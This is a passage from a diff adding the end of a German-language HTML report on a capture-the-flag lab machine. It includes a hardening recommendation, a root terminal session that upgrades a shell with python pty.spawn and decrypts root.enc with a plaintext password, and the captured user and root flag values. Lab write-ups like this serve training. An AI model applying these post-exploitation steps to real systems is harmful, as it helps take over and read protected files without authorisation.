+                <strong>Empfehlung (Admin):</strong> Ersetzen Sie veraltete Verschlüsselungs- und Schlüsselableitungsverfahren (wie die in der Warnung von openssl erwähnten) durch moderne und sichere Methoden (z.B. mit PBKDF2 oder Argon2). Überprüfen Sie alle verschlüsselten Dateien auf dem System auf ihre Sicherheit und ob die Schlüssel sicher verwaltet werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">export TERM=xterm</span>
+<span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+<span class="command">root@pam:~# stty rows 47 columns 190</span>
+
+<span class="command">root@pam:~# openssl enc -aes-256-cbc -d -in root.enc -out root.txt -k <span class="password">rootisCLOSE</span></span>
+<span class="command">*** WARNING : deprecated key derivation used.</span>
+<span class="command">Using -iter or -pbkdf2 would be better.</span>
+<span class="command">root@pam:~# ls -la</span>
+<span class="command">total 36</span>
+<span class="command">drwx------  3 root root 4096 jun 10 23:00 .</span>
+<span class="command">drwxr-xr-x 18 root root 4096 ago 18  2022 ..</span>
+<span class="command">lrwxrwxrwx  1 root root    9 ago 18  2022 .bash_history -> /dev/null</span>
+<span class="command">-rw-r--r--  1 root root  571 abr 10  2021 .bashrc</span>
+<span class="command">drwxr-xr-x  3 root root 4096 ago 18  2022 .local</span>
+<span class="command">-rw-------  1 root root  101 ago 18  2022 .mysql_history</span>
+<span class="command">-rw-r--r--  1 root root  161 jul  9  2019 .profile</span>
+<span class="command">-rw-------  1 root root   48 ago 18  2022 root.enc</span>
+<span class="command">-rw-r--r--  1 root root   24 jun 10 23:00 root.txt</span>
+<span class="command">-rw-r--r--  1 root root  165 ago 18  2022 .wget-hsts</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/italia/user.txt</div>
+                    <div class="flag-value"><span class="password">mcZavkYkoLYUEHxQNNyiHMV</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMVZcBzDKmcFJwnkdsnQbXV</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 19. Mai 2025</p>
+    </footer>
+
+</body>
+</html>
